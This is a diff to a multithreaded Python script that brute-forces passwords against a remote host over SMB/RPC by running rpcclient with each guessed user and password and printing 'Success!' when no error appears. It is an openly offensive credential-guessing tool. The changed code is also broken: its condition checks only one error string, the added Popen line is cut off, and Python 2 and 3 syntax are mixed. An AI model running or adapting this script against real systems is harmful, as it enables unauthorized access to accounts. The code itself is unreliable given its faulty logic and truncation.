@@ -28,14 +28,10 @@ class workerthread(threading.Thread):
         while True:
             try:
                 pwd = self.q.get().strip('\n')
-                out = s.run(['rpcclient', '-U',
-                            '{}%{}'.format(self.user, pwd),
-                            self.rhost], stdout=s.PIPE, stderr=s.PIPE,
-                            encoding='utf-8')
+                out = s.Popen(["rpcclient", "-U", "{}%{}".format(self.user, pwd), self.rhost], stdout=s.PIPE>
 
-                if ('DENIED' or 'TIMEOUT') not in out.stdout:
-                    print 'Success! user:{} pass:{}'.format(self.user,
-                            pwd)
+                if ('Error' or 'DENIED' or 'TIMEOUT') not in out.stdout:
+                    print 'Success! user:{} pass:{}'.format(self.user, pwd)
                     sys.exit()
 
                 if 'TIMEOUT' in out.stdout:
@@ -51,7 +47,6 @@ class workerthread(threading.Thread):
                 return
 
             self.q.task_done()
-
 
 def build_pwd_queue(pwdfile):
     pwdq = queue.Queue()
